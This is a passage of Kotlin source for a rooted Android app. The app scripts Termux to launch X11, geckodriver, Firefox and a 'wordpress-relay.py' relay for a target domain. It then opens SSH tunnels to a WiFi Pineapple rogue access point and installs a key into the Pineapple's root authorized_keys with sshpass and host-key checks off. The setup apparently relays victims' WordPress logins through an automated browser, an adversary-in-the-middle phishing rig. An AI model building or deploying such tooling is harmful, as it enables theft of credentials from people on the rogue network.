                                            export TMPDIR="${'$'}HOME/tmp"

                                            export DISPLAY=:0

                                            unset MOZ_HEADLESS
                                            export MOZ_CRASHREPORTER_DISABLE=1

                                            mkdir -p "${'$'}TMPDIR"
                                            cd "${'$'}HOME"

                                            # Test write permissions first
                                            if ! touch test_write_permission.tmp 2>/dev/null; then
                                                echo "ERROR: Cannot write to ${'$'}HOME - permission denied" >&2
                                                echo "Please run as root:" >&2
                                                echo "  chown -R $(id -u):$(id -g) ${'$'}HOME" >&2
                                                echo "  chmod -R u+w ${'$'}HOME" >&2
                                                exit 1
                                            fi
                                            rm -f test_write_permission.tmp

                                            echo "Button 4 pressed at ${'$'}(date)" > button4_test.log || true

                                            echo "Cleaning up previous processes..." > cleanup.log
                                            pkill -9 -f python.*wordpress-relay || true
                                            pkill -9 -f geckodriver || true
                                            pkill -9 -f firefox || true
                                            pkill -9 -f termux-x11 || true
                                            pkill -f 'ssh.*172.16.42.1' || true

                                            echo "Waiting for ports to be released..." >> cleanup.log
                                            for i in {1..10}; do
                                                PORTS_IN_USE=0
                                                nc -z 127.0.0.1 6000 2>/dev/null && PORTS_IN_USE=1
                                                nc -z 127.0.0.1 4444 2>/dev/null && PORTS_IN_USE=1
                                                nc -z 127.0.0.1 8080 2>/dev/null && PORTS_IN_USE=1
                                                nc -z 127.0.0.1 9998 2>/dev/null && PORTS_IN_USE=1
                                                
                                                if [ "${'$'}PORTS_IN_USE" -eq 0 ]; then
                                                    echo "All ports released after ${'$'}i seconds" >> cleanup.log
                                                    break
                                                fi
                                                sleep 1
                                            done
                                            sleep 2

                                            echo "Starting X11 server with TCP..." > x11_output.log
                                            echo "DISPLAY=${'$'}DISPLAY" >> x11_output.log
                                            termux-x11 :0 -ac -listen tcp >> x11_output.log 2>&1 &
                                            X11_PID=${'$'}!
                                            echo "X11 started with PID: ${'$'}X11_PID" >> x11_output.log

                                            X11_READY=0
                                            for i in {1..30}; do
                                                if ! kill -0 ${'$'}X11_PID 2>/dev/null; then
                                                    echo "ERROR: X11 process died" >> x11_output.log
                                                    exit 1
                                                fi
                                                if nc -z 127.0.0.1 6000 2>/dev/null; then
                                                    echo "✓ X11 listening on TCP port 6000 after ${'$'}i seconds" >> x11_output.log
                                                    X11_READY=1
                                                    break
                                                fi
                                                sleep 1
                                            done
                                            if [ "${'$'}X11_READY" -eq 0 ]; then
                                                echo "ERROR: X11 not listening on port 6000" >> x11_output.log
                                                exit 1
                                            fi

                                            sleep 3

                                            echo "Testing Firefox with DISPLAY=${'$'}DISPLAY..." >> x11_output.log
                                            timeout 10 firefox --no-remote --new-instance about:blank > firefox_test.log 2>&1 &
                                            FIREFOX_TEST_PID=${'$'}!
                                            sleep 4
                                            if kill -0 ${'$'}FIREFOX_TEST_PID 2>/dev/null; then
                                                echo "✓ Firefox test SUCCESSFUL (PID: ${'$'}FIREFOX_TEST_PID)" >> x11_output.log
                                                kill ${'$'}FIREFOX_TEST_PID 2>/dev/null || true
                                                pkill -f firefox || true
                                                sleep 2
                                            else
                                                echo "✗ Firefox test FAILED" >> x11_output.log
                                                cat firefox_test.log >> x11_output.log
                                            fi

                                            {
                                                echo "== Environment =="
                                                echo "DISPLAY=${'$'}DISPLAY"
                                                echo "TMPDIR=${'$'}TMPDIR"
                                                echo "HOME=${'$'}HOME"
                                                echo ""
                                                echo "== Port Check (using nc) =="
                                                echo -n "Port 6000: "; nc -z 127.0.0.1 6000 2>/dev/null && echo "LISTENING" || echo "NOT LISTENING"
                                                echo -n "Port 4444: "; nc -z 127.0.0.1 4444 2>/dev/null && echo "LISTENING" || echo "NOT LISTENING"
                                                echo -n "Port 8080: "; nc -z 127.0.0.1 8080 2>/dev/null && echo "LISTENING" || echo "NOT LISTENING"
                                                echo ""
                                                echo "== Processes =="
                                                ps aux | grep -E "(termux-x11|firefox|gecko)" | grep -v grep || true
                                            } > env_check.log 2>&1

                                            echo "Starting geckodriver..." >> x11_output.log
                                            geckodriver --port 4444 --log debug > geckodriver.log 2>&1 &
                                            GECKO_PID=${'$'}!
                                            echo "Geckodriver PID: ${'$'}GECKO_PID" >> x11_output.log
                                            sleep 3
                                            if ! kill -0 ${'$'}GECKO_PID 2>/dev/null; then
                                                echo "ERROR: Geckodriver died" >> x11_output.log
                                                cat geckodriver.log >> x11_output.log
                                                exit 1
                                            fi

                                            echo "Starting Python relay with domain: $domain..." >> x11_output.log
                                            python -u "${'$'}HOME/wordpress-relay.py" --domain $domain --port 8080 > python_output.log 2>&1 &
                                            PYTHON_PID=${'$'}!

                                            echo "=== All processes started ===" >> x11_output.log
                                            echo "X11: ${'$'}X11_PID (TCP port 6000)" >> x11_output.log
                                            echo "Geckodriver: ${'$'}GECKO_PID (port 4444)" >> x11_output.log
                                            echo "Python: ${'$'}PYTHON_PID (port 8080, domain: $domain)" >> x11_output.log

                                            echo "" >> x11_output.log
                                            echo "=== Waiting for all required ports to be listening ===" >> x11_output.log
                                            echo 'Checking required ports using nc...' > ssh_setup.log

                                            ALL_PORTS_READY=0
                                            for attempt in {1..60}; do
                                                PORT_6000_OK=0
                                                PORT_4444_OK=0
                                                PORT_8080_OK=0
                                                
                                                if nc -z 127.0.0.1 6000 2>/dev/null; then
                                                    PORT_6000_OK=1
                                                fi
                                                
                                                if nc -z 127.0.0.1 4444 2>/dev/null; then
                                                    PORT_4444_OK=1
                                                fi
                                                
                                                if nc -z 127.0.0.1 8080 2>/dev/null; then
                                                    PORT_8080_OK=1
                                                fi
                                                
                                                echo "Attempt ${'$'}attempt/60:" >> ssh_setup.log
                                                echo "  Port 6000 (X11):        ${'$'}([ "${'$'}PORT_6000_OK" -eq 1 ] && echo '✓' || echo '✗')" >> ssh_setup.log
                                                echo "  Port 4444 (geckodriver): ${'$'}([ "${'$'}PORT_4444_OK" -eq 1 ] && echo '✓' || echo '✗')" >> ssh_setup.log
                                                echo "  Port 8080 (python):      ${'$'}([ "${'$'}PORT_8080_OK" -eq 1 ] && echo '✓' || echo '✗')" >> ssh_setup.log
                                                
                                                if [ "${'$'}PORT_6000_OK" -eq 1 ] && [ "${'$'}PORT_4444_OK" -eq 1 ] && [ "${'$'}PORT_8080_OK" -eq 1 ]; then
                                                    echo "" >> ssh_setup.log
                                                    echo "✓ All required ports are listening after ${'$'}attempt seconds!" >> ssh_setup.log
                                                    echo "✓ All required ports confirmed listening after ${'$'}attempt seconds" >> x11_output.log
                                                    ALL_PORTS_READY=1
                                                    break
                                                fi
                                                
                                                sleep 1
                                            done

                                            if [ "${'$'}ALL_PORTS_READY" -eq 0 ]; then
                                                echo "" >> ssh_setup.log
                                                echo "✗ FATAL: Not all required ports listening after 60 seconds" >> ssh_setup.log
                                                echo "ERROR: Port readiness check failed" >> x11_output.log
                                                echo "" >> ssh_setup.log
                                                echo "Final port status using nc:" >> ssh_setup.log
                                                echo -n "  Port 6000: " >> ssh_setup.log
                                                nc -z 127.0.0.1 6000 2>/dev/null && echo "LISTENING" >> ssh_setup.log || echo "NOT LISTENING" >> ssh_setup.log
                                                echo -n "  Port 4444: " >> ssh_setup.log
                                                nc -z 127.0.0.1 4444 2>/dev/null && echo "LISTENING" >> ssh_setup.log || echo "NOT LISTENING" >> ssh_setup.log
                                                echo -n "  Port 8080: " >> ssh_setup.log
                                                nc -z 127.0.0.1 8080 2>/dev/null && echo "LISTENING" >> ssh_setup.log || echo "NOT LISTENING" >> ssh_setup.log
                                                echo "" >> ssh_setup.log
                                                echo "Process status:" >> ssh_setup.log
                                                ps aux | grep -E "(termux-x11|geckodriver|python.*wordpress)" | grep -v grep >> ssh_setup.log || echo "No processes found" >> ssh_setup.log
                                                echo "SSH_SETUP_FAILED:PORTS_NOT_READY" >> ssh_setup.log
                                                exit 1
                                            fi

                                            echo "" >> ssh_setup.log
                                            echo "=== SSH Port Forward Setup ===" >> ssh_setup.log
                                            echo "" >> x11_output.log
                                            echo "=== SSH Port Forward Setup ===" >> x11_output.log

                                            echo "Cleaning up old SSH tunnels..." >> ssh_setup.log
                                            pkill -f 'ssh.*172.16.42.1' || true
                                            sleep 2

                                            echo "Checking network connectivity to Pineapple..." >> ssh_setup.log
                                            if timeout 10 ping -c 2 172.16.42.1 > /dev/null 2>&1; then
                                                echo "✓ Network connectivity confirmed" >> ssh_setup.log
                                            else
                                                echo "✗ FATAL: Cannot reach Pineapple at 172.16.42.1" >> ssh_setup.log
                                                echo "SSH_SETUP_FAILED:NO_NETWORK" >> ssh_setup.log
                                                exit 2
                                            fi

                                            echo "Setting up Forward 1: Pineapple:9999 → Android:8080" >> ssh_setup.log
                                            nohup ssh -i ~/.ssh/pineapple -o StrictHostKeyChecking=no -o ConnectTimeout=10 -N -R 9999:localhost:8080 root@172.16.42.1 > ssh_forward1.log 2>&1 &
                                            FORWARD1_PID=${'$'}!
                                            echo "Forward 1 PID: ${'$'}FORWARD1_PID" >> ssh_setup.log
                                            echo "Forward 1 started with PID: ${'$'}FORWARD1_PID" >> x11_output.log
                                            sleep 3
                                            if ! kill -0 ${'$'}FORWARD1_PID 2>/dev/null; then
                                                echo "✗ FATAL: Forward 1 SSH tunnel failed to establish" >> ssh_setup.log
                                                cat ssh_forward1.log >> ssh_setup.log
                                                echo "SSH_SETUP_FAILED:FORWARD1_DIED" >> ssh_setup.log
                                                exit 2
                                            fi
                                            echo "✓ Forward 1 verified running" >> ssh_setup.log

                                            echo "Setting up Forward 2: Android:9998 → Pineapple:80" >> ssh_setup.log
                                            nohup ssh -i ~/.ssh/pineapple -o StrictHostKeyChecking=no -o ConnectTimeout=10 -N -L 9998:172.16.42.1:80 root@172.16.42.1 > ssh_forward2.log 2>&1 &
                                            FORWARD2_PID=${'$'}!
                                            echo "Forward 2 PID: ${'$'}FORWARD2_PID" >> ssh_setup.log
                                            echo "Forward 2 started with PID: ${'$'}FORWARD2_PID" >> x11_output.log
                                            sleep 3

                                            echo '' >> ssh_setup.log
                                            echo '=== SSH Tunnel Status ===' >> ssh_setup.log
                                            ps aux | grep 'ssh.*172.16.42.1' | grep -v grep >> ssh_setup.log || echo 'No SSH tunnels found' >> ssh_setup.log

                                            echo '' >> ssh_setup.log
                                            echo '=== Port Status (using nc) ===' >> ssh_setup.log
                                            echo -n "Port 8080: " >> ssh_setup.log
                                            nc -z 127.0.0.1 8080 2>/dev/null && echo "LISTENING" >> ssh_setup.log || echo "NOT LISTENING" >> ssh_setup.log
                                            echo -n "Port 9998: " >> ssh_setup.log
                                            nc -z 127.0.0.1 9998 2>/dev/null && echo "LISTENING" >> ssh_setup.log || echo "NOT LISTENING" >> ssh_setup.log

                                            echo 'SSH_SETUP_SUCCESS' >> ssh_setup.log
                                            echo 'SSH setup complete!' >> ssh_setup.log
                                            echo "✓ SSH port forwards configured" >> x11_output.log

                                            echo "" >> x11_output.log
                                            echo "=== COMPLETE SETUP SUMMARY ===" >> x11_output.log
                                            echo "All services started and SSH tunnels established" >> x11_output.log
                                            echo "X11 PID: ${'$'}X11_PID" >> x11_output.log
                                            echo "Geckodriver PID: ${'$'}GECKO_PID" >> x11_output.log
                                            echo "Python PID: ${'$'}PYTHON_PID" >> x11_output.log
                                            echo "SSH Forward 1 PID: ${'$'}FORWARD1_PID" >> x11_output.log
                                            echo "SSH Forward 2 PID: ${'$'}FORWARD2_PID" >> x11_output.log
                                        """.trimIndent()

                                        writeFileAsRoot(SD_SCRIPT, scriptContent)
                                        execAsRoot("chmod 644 $SD_SCRIPT")

                                        try {
                                            val termuxLaunch = packageManager.getLaunchIntentForPackage("com.termux")
                                                ?: Intent().apply {
                                                    setClassName("com.termux", "com.termux.app.TermuxActivity")
                                                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                                                }
                                            startActivity(termuxLaunch)
                                            Thread.sleep(1200)
                                            val returnIntent = Intent(this@MainActivity, MainActivity::class.java).apply {
                                                flags = Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                                            }
                                            startActivity(returnIntent)
                                        } catch (_: ActivityNotFoundException) {
                                            runOnUiThread { textView.text = "❌ Termux not installed." }
                                            return@Thread
                                        } catch (e: Exception) {
                                            runOnUiThread { textView.text = "❌ Unable to launch Termux (${e.message})." }
                                            return@Thread
                                        }

                                        val pipeline = "cat $SD_SCRIPT | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                                        Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))

                                        // Delete old python_output.log before starting
                                        val deleteLogScript = """
                                            #!/data/data/com.termux/files/usr/bin/bash
                                            export HOME=/data/data/com.termux/files/home
                                            export PREFIX=/data/data/com.termux/files/usr
                                            export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                                            cd "${'$'}HOME"
                                            rm -f python_output.log
                                            echo "DELETED"
                                        """.trimIndent()

                                        val deleteLogScriptPath = "/sdcard/delete_python_log.sh"
                                        writeFileAsRoot(deleteLogScriptPath, deleteLogScript)
                                        execAsRoot("chmod 644 $deleteLogScriptPath")

                                        val deletePipeline = "cat $deleteLogScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                                        val deleteProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", deletePipeline))
                                        deleteProc.waitFor()

                                        // Don't wait for process - let it run in background
                                        runOnUiThread {
                                            textView.text = "🚀 Services starting...\n⏳ Waiting for Python output log at:\n/data/data/com.termux/files/home/python_output.log\n\n"
                                        }

                                        Thread.sleep(1500)

                                        // Wait for python_output.log to be created (with timeout)
                                        val logPath = "$TERMUX_HOME/python_output.log"
                                        var logExists = false
                                        val maxWaitSeconds = 60
                                        val startTime = System.currentTimeMillis()

                                        while (!logExists && (System.currentTimeMillis() - startTime) < maxWaitSeconds * 1000) {
                                            val elapsed = (System.currentTimeMillis() - startTime) / 1000
                                            
                                            // Use the same method as readUrlScript to check for file
                                            val checkFileScript = """
                                                #!/data/data/com.termux/files/usr/bin/bash
                                                export HOME=/data/data/com.termux/files/home
                                                export PREFIX=/data/data/com.termux/files/usr
                                                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                                                cd "${'$'}HOME"
                                                if [ -f python_output.log ]; then
                                                    echo "FILE_EXISTS"
                                                else
                                                    echo "FILE_NOT_FOUND"
                                                fi
                                            """.trimIndent()

                                            val checkFileScriptPath = "/sdcard/check_python_log.sh"
                                            writeFileAsRoot(checkFileScriptPath, checkFileScript)
                                            execAsRoot("chmod 644 $checkFileScriptPath")

                                            val checkPipeline = "cat $checkFileScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                                            val checkProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", checkPipeline))
                                            val checkOutput = BufferedReader(InputStreamReader(checkProc.inputStream)).use { it.readText() }
                                            checkProc.waitFor()
                                            
                                            if (checkOutput.trim() == "FILE_EXISTS") {
                                                logExists = true
                                                runOnUiThread {
                                                    textView.append("\n✅ File detected after ${elapsed}s!\n")
                                                }
                                            } else {
                                                if (elapsed % 5 == 0L) {  // Update every 5 seconds
                                                    runOnUiThread {
                                                        textView.append("Still waiting... ${elapsed}s elapsed\n")
                                                    }
                                                }
                                                Thread.sleep(1000)
                                            }
                                        }

                                        if (!logExists) {
                                            runOnUiThread {
                                                textView.append("\n❌ Python output log not created after $maxWaitSeconds seconds\n\n" +
                                                        "Services may still be starting. Check manually:\n" +
                                                        "tail -f ~/python_output.log")
                                            }
                                            return@Thread
                                        }

                                        runOnUiThread {
                                            textView.text = "✅ Python is ready! Streaming output...\n\n"
                                        }

                                        // Monitor python_output.log for browser spawning and successful connection
                                        var shouldLaunchX11 = false
                                        val monitorThread = Thread {
                                            try {
                                                val tailScript = """
                                                    #!/data/data/com.termux/files/usr/bin/bash
                                                    export HOME=/data/data/com.termux/files/home
                                                    export PREFIX=/data/data/com.termux/files/usr
                                                    export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                                                    cd "${'$'}HOME"
                                                    tail -f python_output.log
                                                """.trimIndent()

                                                val tailScriptPath = "/sdcard/tail_python_log.sh"
                                                writeFileAsRoot(tailScriptPath, tailScript)
                                                execAsRoot("chmod 644 $tailScriptPath")

                                                val tailPipeline = "cat $tailScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                                                val tailProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", tailPipeline))
                                                val reader = BufferedReader(InputStreamReader(tailProc.inputStream))
                                                
                                                val outputBuffer = StringBuilder()
                                                reader.use { input ->
                                                    var line: String?
                                                    while (input.readLine().also { line = it } != null) {
                                                        outputBuffer.append(line).append("\n")
                                                        
                                                        // Check for browser spawn and successful connection
                                                        if (!shouldLaunchX11 && 
                                                            outputBuffer.contains("Firefox is ready! Waiting for login requests")) {
                                                            shouldLaunchX11 = true
                                                            
                                                            // Launch Termux:X11
                                                            Handler(Looper.getMainLooper()).post {
                                                                try {
                                                                    val x11Launch = packageManager.getLaunchIntentForPackage("com.termux.x11")
                                                                        ?: Intent().apply {
                                                                            setClassName("com.termux.x11", "com.termux.x11.MainActivity")
                                                                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
                                                                        }
                                                                    startActivity(x11Launch)
                                                                } catch (e: ActivityNotFoundException) {
                                                                    // Silently fail - X11 not installed
                                                                } catch (e: Exception) {
                                                                    // Silently fail
                                                                }
                                                            }
                                                        }
                                                        
                                                        // Update UI with latest output
                                                        runOnUiThread {
                                                            textView.text = outputBuffer.toString()
                                                            // Auto-scroll to bottom
                                                            val scrollView = textView.parent as? android.widget.ScrollView
                                                            scrollView?.post {
                                                                scrollView.fullScroll(android.view.View.FOCUS_DOWN)
                                                            }
                                                        }
                                                        
                                                        // Optional: limit buffer size to prevent memory issues
                                                        if (outputBuffer.length > 50000) {
                                                            // Keep only last 40000 characters
                                                            outputBuffer.delete(0, outputBuffer.length - 40000)
                                                        }
                                                    }
                                                }
                                            } catch (e: Exception) {
                                                // Log monitoring failed
                                            }
                                        }
                                        monitorThread.start()

                                    } catch (e: Exception) {
                                        runOnUiThread { textView.text = "Error: ${e.message}\n${e.stackTraceToString()}" }
                                    }
                                }.start()
                            }
                        }

                        dialog.show()
                    }

                } catch (e: Exception) {
                    runOnUiThread { textView.text = "Error loading last URL: ${e.message}\n${e.stackTraceToString()}" }
                }
            }.start()
        }
    }

    private fun generateSshKeyPair(statusMessage: StringBuilder): Boolean {
        try {
            val keygenLines = mutableListOf<String>()
            keygenLines.add("#!/data/data/com.termux/files/usr/bin/bash")
            keygenLines.add("set -e")
            keygenLines.add("")
            keygenLines.add("export HOME=/data/data/com.termux/files/home")
            keygenLines.add("export PREFIX=/data/data/com.termux/files/usr")
            keygenLines.add("export PATH=\"${'$'}PREFIX/bin:${'$'}PATH\"")
            keygenLines.add("")
            keygenLines.add("cd \"${'$'}HOME\"")
            keygenLines.add("")
            keygenLines.add("mkdir -p .ssh")
            keygenLines.add("ssh-keygen -t ed25519 -f .ssh/pineapple -N ''")
            keygenLines.add("echo 'KEYGEN:SUCCESS'")

            val keygenScript = keygenLines.joinToString("\n")
            val keygenScriptPath = "/sdcard/generate_key.sh"
            writeFileAsRoot(keygenScriptPath, keygenScript)
            execAsRoot("chmod 644 $keygenScriptPath")

            val keygenPipeline = "cat $keygenScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val keygenProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", keygenPipeline))
            val keygenOutput = BufferedReader(InputStreamReader(keygenProc.inputStream)).use { it.readText() }
            val keygenError = BufferedReader(InputStreamReader(keygenProc.errorStream)).use { it.readText() }
            keygenProc.waitFor()

            if (keygenOutput.contains("KEYGEN:SUCCESS")) {
                statusMessage.appendLine("✅ SSH key pair generated!\n")
                return true
            } else {
                statusMessage.appendLine("❌ Failed to generate SSH key\n")
                if (keygenOutput.isNotBlank()) statusMessage.appendLine("Output: $keygenOutput\n")
                if (keygenError.isNotBlank()) statusMessage.appendLine("Error: $keygenError\n")
                return false
            }
        } catch (e: Exception) {
            statusMessage.appendLine("❌ Exception during key generation: ${e.message}\n")
            return false
        }
    }

    private fun deleteSshKeyPair(statusMessage: StringBuilder): Boolean {
        try {
            val deleteLines = mutableListOf<String>()
            deleteLines.add("#!/data/data/com.termux/files/usr/bin/bash")
            deleteLines.add("set -e")
            deleteLines.add("")
            deleteLines.add("export HOME=/data/data/com.termux/files/home")
            deleteLines.add("export PREFIX=/data/data/com.termux/files/usr")
            deleteLines.add("export PATH=\"${'$'}PREFIX/bin:${'$'}PATH\"")
            deleteLines.add("")
            deleteLines.add("cd \"${'$'}HOME\"")
            deleteLines.add("")
            deleteLines.add("rm -f .ssh/pineapple .ssh/pineapple.pub")
            deleteLines.add("echo 'DELETE:SUCCESS'")

            val deleteScript = deleteLines.joinToString("\n")
            val deleteScriptPath = "/sdcard/delete_key.sh"
            writeFileAsRoot(deleteScriptPath, deleteScript)
            execAsRoot("chmod 644 $deleteScriptPath")

            val deletePipeline = "cat $deleteScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val deleteProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", deletePipeline))
            val deleteOutput = BufferedReader(InputStreamReader(deleteProc.inputStream)).use { it.readText() }
            deleteProc.waitFor()

            if (deleteOutput.contains("DELETE:SUCCESS")) {
                statusMessage.appendLine("✅ Malformed key pair deleted")
                return true
            } else {
                statusMessage.appendLine("❌ Failed to delete key pair")
                return false
            }
        } catch (e: Exception) {
            statusMessage.appendLine("❌ Exception during key deletion: ${e.message}")
            return false
        }
    }

    private fun transferKeyWithPasswordAndRegenerate(password: String, statusMessage: StringBuilder): Boolean {
        try {
            val sshpassLines = mutableListOf<String>()
            sshpassLines.add("#!/data/data/com.termux/files/usr/bin/bash")
            sshpassLines.add("set +e")
            sshpassLines.add("")
            sshpassLines.add("export HOME=/data/data/com.termux/files/home")
            sshpassLines.add("export PREFIX=/data/data/com.termux/files/usr")
            sshpassLines.add("export PATH=\"${'$'}PREFIX/bin:${'$'}PATH\"")
            sshpassLines.add("")
            sshpassLines.add("cd \"${'$'}HOME\"")
            sshpassLines.add("")
            sshpassLines.add("echo 'SSHPASS:START'")
            sshpassLines.add("")
            sshpassLines.add("if [ ! -f .ssh/pineapple.pub ]; then")
            sshpassLines.add("  echo 'SSHPASS:NO_PUBLIC_KEY'")
            sshpassLines.add("  echo 'SSHPASS:END'")
            sshpassLines.add("  exit 1")
            sshpassLines.add("fi")
            sshpassLines.add("")
            sshpassLines.add("PASS_FILE=\"${'$'}HOME/.ssh_pass_temp\"")
            sshpassLines.add("")
            sshpassLines.add("sshpass -f \"${'$'}PASS_FILE\" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@172.16.42.1 'mkdir -p /root/.ssh && chmod 700 /root/.ssh && cat >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys' < .ssh/pineapple.pub 2>sshpass_error.txt")
            sshpassLines.add("SSHPASS_EXIT=${'$'}?")
            sshpassLines.add("")
            sshpassLines.add("rm -f \"${'$'}PASS_FILE\"")
            sshpassLines.add("")
            sshpassLines.add("if [ ${'$'}SSHPASS_EXIT -eq 0 ]; then")
            sshpassLines.add("  echo 'SSHPASS:SUCCESS'")
            sshpassLines.add("else")
            sshpassLines.add("  echo 'SSHPASS:FAILED'")
            sshpassLines.add("  echo 'SSHPASS_EXIT_CODE:'${'$'}SSHPASS_EXIT")
            sshpassLines.add("  if [ -f sshpass_error.txt ]; then")
            sshpassLines.add("    echo 'SSHPASS_ERROR:'")
            sshpassLines.add("    cat sshpass_error.txt")
            sshpassLines.add("  fi")
            sshpassLines.add("fi")
            sshpassLines.add("")
            sshpassLines.add("echo 'SSHPASS:END'")

            val sshpassScript = sshpassLines.joinToString("\n")
            val sshpassScriptPath = "/sdcard/sshpass_transfer.sh"
            writeFileAsRoot(sshpassScriptPath, sshpassScript)
            execAsRoot("chmod 644 $sshpassScriptPath")

            val writePasswordScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=/data/data/com.termux/files/home
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                cd "${'$'}HOME"
                echo '${password.replace("'", "'\\''")}' > .ssh_pass_temp
                chmod 600 .ssh_pass_temp
                echo 'PASSWORD_FILE_CREATED'
            """.trimIndent()

            val writePasswordScriptPath = "/sdcard/write_password.sh"
            writeFileAsRoot(writePasswordScriptPath, writePasswordScript)
            execAsRoot("chmod 644 $writePasswordScriptPath")

            val writePasswordPipeline = "cat $writePasswordScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val writePasswordProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", writePasswordPipeline))
            val writePasswordOut = BufferedReader(InputStreamReader(writePasswordProc.inputStream)).use { it.readText() }
            writePasswordProc.waitFor()

            if (!writePasswordOut.contains("PASSWORD_FILE_CREATED")) {
                statusMessage.apply {
                    appendLine("")
                    appendLine("❌ Failed to create temporary password file")
                }
                return false
            }

            val sshpassPipeline = "cat $sshpassScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val sshpassProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", sshpassPipeline))
            val sshpassOut = BufferedReader(InputStreamReader(sshpassProc.inputStream)).use { it.readText() }
            val sshpassErr = BufferedReader(InputStreamReader(sshpassProc.errorStream)).use { it.readText() }
            sshpassProc.waitFor()

            val sshpassSuccess = sshpassOut.contains("SSHPASS:SUCCESS")
            val noPublicKey = sshpassOut.contains("SSHPASS:NO_PUBLIC_KEY")

            statusMessage.apply {
                appendLine("")
                when {
                    sshpassSuccess -> {
                        appendLine("✅ Automatic key transfer successful!")
                        appendLine("   Public key has been added to authorized_keys on the Pineapple")
                    }
                    noPublicKey -> {
                        appendLine("❌ Automatic key transfer failed: .ssh/pineapple.pub not found")
                    }
                    else -> {
                        appendLine("❌ Automatic key transfer failed")
                        if (sshpassOut.contains("SSHPASS_ERROR:")) {
                            val errorStart = sshpassOut.indexOf("SSHPASS_ERROR:")
                            val errorEnd = sshpassOut.indexOf("SSHPASS:END", errorStart)
                            if (errorEnd > errorStart) {
                                appendLine("   Error details:")
                                appendLine("   " + sshpassOut.substring(errorStart + 14, errorEnd).trim())
                            }
                        }
                        if (sshpassOut.contains("SSHPASS_EXIT_CODE:")) {
                            val exitCodeLine = sshpassOut.lines().find { it.startsWith("SSHPASS_EXIT_CODE:") }
                            appendLine("   Exit code: ${exitCodeLine?.substringAfter(":")}")
                        }
                    }
                }
            }

            if (sshpassSuccess) {
                statusMessage.appendLine("")
                statusMessage.appendLine("🔄 Verifying SSH connection after key transfer...")

                val verifyLines = mutableListOf<String>()
                verifyLines.add("#!/data/data/com.termux/files/usr/bin/bash")
                verifyLines.add("set +e")
                verifyLines.add("")
                verifyLines.add("export HOME=/data/data/com.termux/files/home")
                verifyLines.add("export PREFIX=/data/data/com.termux/files/usr")
                verifyLines.add("export PATH=\"${'$'}PREFIX/bin:${'$'}PATH\"")
                verifyLines.add("")
                verifyLines.add("cd \"${'$'}HOME\"")
                verifyLines.add("")
                verifyLines.add("ssh -i .ssh/pineapple -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 root@172.16.42.1 true 2>/dev/null")
                verifyLines.add("if [ ${'$'}? -eq 0 ]; then")
                verifyLines.add("  echo 'VERIFY:SUCCESS'")
                verifyLines.add("else")
                verifyLines.add("  echo 'VERIFY:FAILED'")
                verifyLines.add("fi")

                val verifyScript = verifyLines.joinToString("\n")
                val verifyScriptPath = "/sdcard/verify_connection.sh"
                writeFileAsRoot(verifyScriptPath, verifyScript)
                execAsRoot("chmod 644 $verifyScriptPath")

                val verifyPipeline = "cat $verifyScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                val verifyProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", verifyPipeline))
                val verifyOut = BufferedReader(InputStreamReader(verifyProc.inputStream)).use { it.readText() }
                verifyProc.waitFor()

                val verifySuccess = verifyOut.contains("VERIFY:SUCCESS")
                statusMessage.apply {
                    if (verifySuccess) {
                        appendLine("✅ SSH connection verified - pubkey authentication now working!")
                    } else {
                        appendLine("⚠️ SSH connection still failing after key transfer")
                        appendLine("   Detected malformed key pair - regenerating keys...")
                    }
                }

                if (!verifySuccess) {
                    val deleteSuccess = deleteSshKeyPair(statusMessage)

                    if (deleteSuccess) {
                        val newKeygenSuccess = generateSshKeyPair(statusMessage)

                        if (newKeygenSuccess) {
                            statusMessage.appendLine("")
                            statusMessage.appendLine("⚙️ Transferring newly generated key to Pineapple...")

                            val writePasswordProc2 = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", writePasswordPipeline))
                            val writePasswordOut2 = BufferedReader(InputStreamReader(writePasswordProc2.inputStream)).use { it.readText() }
                            writePasswordProc2.waitFor()

                            if (!writePasswordOut2.contains("PASSWORD_FILE_CREATED")) {
                                statusMessage.apply {
                                    appendLine("")
                                    appendLine("❌ Failed to create temporary password file for retry")
                                }
                                return false
                            }

                            val sshpassProc2 = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", sshpassPipeline))
                            val sshpassOut2 = BufferedReader(InputStreamReader(sshpassProc2.inputStream)).use { it.readText() }
                            sshpassProc2.waitFor()

                            val sshpassSuccess2 = sshpassOut2.contains("SSHPASS:SUCCESS")

                            statusMessage.apply {
                                appendLine("")
                                if (sshpassSuccess2) {
                                    appendLine("✅ New key transferred successfully!")
                                } else {
                                    appendLine("❌ Failed to transfer new key")
                                    return false
                                }
                            }

                            statusMessage.appendLine("")
